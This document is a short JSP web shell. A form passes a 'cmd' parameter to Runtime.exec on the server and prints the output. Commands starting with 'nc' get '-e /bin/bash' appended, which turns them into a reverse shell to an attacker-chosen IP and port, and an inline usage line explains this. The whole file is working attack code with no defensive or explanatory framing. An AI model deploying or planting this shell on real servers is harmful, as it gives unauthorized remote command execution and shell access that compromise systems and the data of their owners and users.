<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
Use : nc [ip] [port] to $ nc [ip] [port] -e /bin/bash
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      if (cmd.startsWith("nc")) { 
         //cmd.replace("reverseshell", "nc");
         cmd += " -e /bin/bash 0>&1"; }
      String s = null;
      output = "$ "+cmd+"</br>";
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   cmd+= e.toString();   }
   }
%>
<pre><%=output %></pre>

